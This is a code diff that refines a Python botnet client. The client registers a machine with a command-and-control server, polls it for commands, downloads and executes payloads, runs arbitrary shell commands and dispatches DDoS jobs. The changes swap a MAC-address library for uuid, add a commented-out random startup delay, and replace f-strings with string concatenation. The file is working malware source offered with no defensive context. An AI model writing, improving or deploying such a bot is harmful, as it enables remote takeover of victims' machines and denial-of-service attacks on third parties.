@@ -3,14 +3,16 @@ import time
 import subprocess
 import ctypes
 import os
-from getmac import get_mac_address as gma
+import re, uuid
 import platform
+import random
 
 
 C2_URL = "http://127.0.0.1:8000/control/"
-BOT_ID = gma()
+BOT_ID = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 POLLING_INTERVAL = 30
-#PAYLOADS_DIR = ""
+
+#time.sleep(random.randint(60, 120))
 
 def is_admin():
     try:
@@ -25,11 +27,9 @@ def os_info():
     elif platform.system() == "Linux":
         return platform.freedesktop_os_release()["NAME"] + " " + platform.release()
 
-print(os_info())
-
 def register():
     try:
-        print(f"[+] Registering bot ID: {BOT_ID}")
+        print("[+] Registering bot ID: " + str(BOT_ID))
         info = {
             "mac": BOT_ID,
             "os": os_info(),
@@ -42,14 +42,14 @@ def register():
         if response.status_code == 200:
             print("[+] Registration successful")
         else:
-            print(f"[-] Registration failed: {response.status_code}")
+            print("[-] Registration failed: " + str(response.status_code))
     except Exception as e:
-        print(f"[-] Error registering with C2: {e}")
+        print("[-] Error registering with C2: " + str(e))
 
 
 def download_and_execute(payload_url, args):
     try:
-        print(f"[+] Downloading payload from {payload_url}")
+        print("[+] Downloading payload from " + payload_url)
         response = requests.get(payload_url)
         
         if response.status_code == 200:
@@ -57,20 +57,20 @@ def download_and_execute(payload_url, args):
             with open(payload_path, "wb") as file:
                 file.write(response.content)
 
-            print(f"[+] Payload downloaded to {payload_path}")
+            print("[+] Payload downloaded to " + payload_path)
 
             if payload_path.endswith(".py"):
-                command = f"python3 {payload_path} {args}"
+                command = "python3 " + payload_path + " " + str(args)
             else:
-                command = f"{payload_path} {args}"
+                command = payload_path + " " + str(args)
                 
-            print(f"[+] Executing payload: {command}")
+            print("[+] Executing payload: " + str(command))
             result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            print(f"[+] Execution result:\n{result.decode('utf-8')}")
+            print("[+] Execution result: " + str({result.decode('utf-8')}))
 
             return result.decode('utf-8')
         else:
-            return f"Failed to download payload: {response.status_code}"
+            return "Failed to download payload: " + str(response.status_code)
     except Exception as e:
         return str(e)
 
@@ -78,7 +78,7 @@ def download_and_execute(payload_url, args):
 def poll_for_commands():
     while True:
         try:
-            print(f"[+] Polling for commands from C2... Bot ID: {BOT_ID}")
+            print("[+] Polling for commands from C2... Bot ID: " + str(BOT_ID))
             response = requests.get(C2_URL + "command/", params={"mac": BOT_ID}, timeout=30)
             print(response.text)
             if response.status_code == 200:
@@ -87,7 +87,7 @@ def poll_for_commands():
                 args = response.json().get("args")
 
                 if command:
-                    print(f"[+] Received command: {command}")
+                    print("[+] Received command: " + command)
                     
                     if command == "ddos":
                         if payload_url:
@@ -97,31 +97,31 @@ def poll_for_commands():
                     elif command == "shell":
                         result = execute_shell_command(args)
                     else:
-                        result = f"Unknown command: {command}"
+                        result = "Unknown command: " + command
                     if result:
                         requests.post(C2_URL + "result/", json={"mac": BOT_ID})
                 else:
                     print("[+] No command received")
 
             else:
-                print(f"[-] Failed to poll: {response.status_code}")
+                print("[-] Failed to poll: " + str(response.status_code))
                 time.sleep(30)
         
         except requests.exceptions.Timeout:
             print("[+] Polling timed out, retrying...")
             time.sleep(POLLING_INTERVAL)
         except Exception as e:
-            print(f"[-] Error polling for commands: {e}")
+            print("[-] Error polling for commands: " + str(e))
             time.sleep(POLLING_INTERVAL)
 
 
 def execute_shell_command(command):
     try:
-        print(f"[+] Executing command: {command}")
+        print("[+] Executing command: " + command)
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
         return result.decode('utf-8')
     except subprocess.CalledProcessError as e:
-        return f"Command failed: {e.output.decode('utf-8')}"
+        return "Command failed"
     except Exception as e:
         return str(e)
 
